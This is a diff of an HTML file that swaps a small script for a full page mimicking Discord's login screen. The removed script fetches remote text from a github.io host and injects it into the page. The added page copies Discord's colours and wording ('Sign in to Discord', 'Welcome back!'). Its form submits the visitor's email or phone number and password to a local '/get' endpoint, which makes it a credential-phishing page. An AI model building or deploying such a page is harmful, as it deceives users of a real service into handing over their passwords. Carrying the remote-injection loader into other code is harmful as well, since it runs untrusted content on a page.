@@ -1,17 +1,138 @@
-<html
-  lang="en-GB"
-  style="font-size: 100%; --saturation-factor: 1; --devtools-sidebar-width: 0px"
-  class="reduce-motion theme-dark platform-web font-size-16"
-  data-rh="lang,style,class"
->
-  <body>
-    <script>
-      let website = "";
-      fetch("https://Websitehoster1.github.io/1/Discord/discord.txt")
-        .then((response) => response.text())
-        .then((data) => {
-          document.body.innerHTML = data;
-        });
-    </script>
-  </body>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #476ACE; /* Discord's dark gray background */
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+        }
+
+        @media (min-width: 600px) {
+            .container {
+                max-width: 500px;
+            }
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-container {
+            background: #2F3136; /* Darker gray box */
+            border-radius: 4px;
+            padding: 20px;
+            box-shadow: 0px 0px 10px 0px rgba(0, 0, 0, 0.2);
+        }
+
+        h1 {
+            text-align: center;
+            font-size: 28px;
+            font-weight: 500;
+            margin-bottom: 20px;
+            color: #ffffff; /* White text */
+        }
+
+        h2 {
+            text-align: center;
+            color: #8A8D90; /* Lighter gray for subtitles */
+        }
+		
+		h3 {
+            text-align: center;
+            color: #8A8D90; /* Lighter gray for subtitles */
+        }
+		
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #202225; /* Dark border */
+            background-color: #40444B; /* Dark input background */
+            border-radius: 4px;
+            box-sizing: border-box;
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #ffffff;
+        }
+
+        .input-field::placeholder {
+            color: #8A8D90; /* Gray placeholder text */
+        }
+
+        .submit-btn {
+            background: #476ACE; /* Discord blue */
+            border: none;
+            color: #ffffff; /* White text */
+            padding: 12px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .submit-btn:hover {
+            background: #5b6eae; /* A bit darker blue for hover */
+        }
+
+        .register-prompt {
+            text-align: left;
+            color: #8A8D90; /* Lighter gray for the "Need an Account?" text */
+            margin-top: 10px; /* Adjust this value as needed for spacing */
+        }
+
+        .register-link {
+            color: #476ACE; /* Discord blue for "Register" */
+            text-decoration: none; /* Remove underline from the link */
+        }
+
+        .register-link:hover {
+            text-decoration: underline; /* Add underline on hover for better UX */
+        }
+
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+
+        <div class="logo">
+            <!-- Replace with the Discord logo SVG or your preferred logo -->
+            <!-- Placeholder SVG here -->
+        </div>
+
+        <div class="form-container">
+
+            <h1>Sign in to Discord</h1>
+			<h1>Welcome back!</h1>
+            <h3>We're so excited to see you again!</h3>
+
+            <form action="/get" id="login-form">
+                <h5><p class="register-prompt">EMAIL OR PHONE NUMBER*</p></h5>
+                <input name="email" class="input-field" type="text" placeholder="" required>
+                <h5><p class="register-prompt">PASSWORD*</p></h5>
+                <input name="password" class="input-field" type="password" placeholder="" required>
+				
+				<p class="register-prompt"><a href="#" class="register-link">Forgot your password?</a></p>
+
+                <button class="submit-btn" type="submit">Log In</button>
+
+                <p class="register-prompt">Need an Account? <a href="#" class="register-link">Register</a></p>
+
+            </form>
+
+        </div>
+
+    </div>
+
+</body>
+
 </html>
